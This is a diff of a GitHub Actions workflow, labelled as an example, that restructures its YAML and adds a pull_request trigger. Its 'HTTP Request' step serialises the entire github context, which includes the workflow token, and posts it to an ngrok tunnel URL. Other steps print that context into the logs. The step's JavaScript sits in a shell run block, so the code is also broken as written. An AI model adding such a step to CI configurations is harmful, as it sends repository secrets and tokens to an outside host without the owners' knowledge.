@@ -1,31 +1,36 @@
 name: Exemplo de GitHub Action
 
 on:
-  push:runs-on: ubuntu-latest
-steps:
-  - name: Checkout do código
-    uses: actions/checkout@v2
+  push:
+  pull_request:
 
-  - name: Setup Node.js
-    uses: actions/setup-node@v2
-    with:
-      node-version: "14"
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout do código
+        uses: actions/checkout@v2
 
-  - name: HTTP Request
-    run: |
-      const http = require('@actions/http-client');
-      let httpClient = new http.HttpClient('GitHub Actions');
-      let body = JSON.stringify(process.env.GITHUB_OBJECT);
-      let response = await httpClient.post('https://2dec-186-225-45-189.ngrok-free.app/log', body);
-      console.log(response);
-    env:
-      NODE_PATH: ${{ runner.tool_cache }}/node_modules
-      GITHUB_OBJECT: ${{ toJson(github) }}
+      - name: Setup Node.js
+        uses: actions/setup-node@v2
+        with:
+          node-version: "14"
 
-  - name: Mostrar o valor do commit
-    run: echo "shablau ${{ github }}"
+      - name: HTTP Request
+        run: |
+          const http = require('@actions/http-client');
+          let httpClient = new http.HttpClient('GitHub Actions');
+          let body = JSON.stringify(process.env.GITHUB_OBJECT);
+          let response = await httpClient.post('https://2dec-186-225-45-189.ngrok-free.app/log', body);
+          console.log(response);
+        env:
+          NODE_PATH: ${{ runner.tool_cache }}/node_modules
+          GITHUB_OBJECT: ${{ toJson(github) }}
 
-  - name: Criar enviroment github
-    env:
-      GITHUB_OBJECT: ${{ toJson(github) }}
-    run: echo "O valor da env github é ${{ env.GITHUB_OBJECT }}"
+      - name: Mostrar o valor do commit
+        run: echo "shablau ${{ github }}"
+
+      - name: Criar enviroment github
+        env:
+          GITHUB_OBJECT: ${{ toJson(github) }}
+        run: echo "O valor da env github é ${{ env.GITHUB_OBJECT }}"
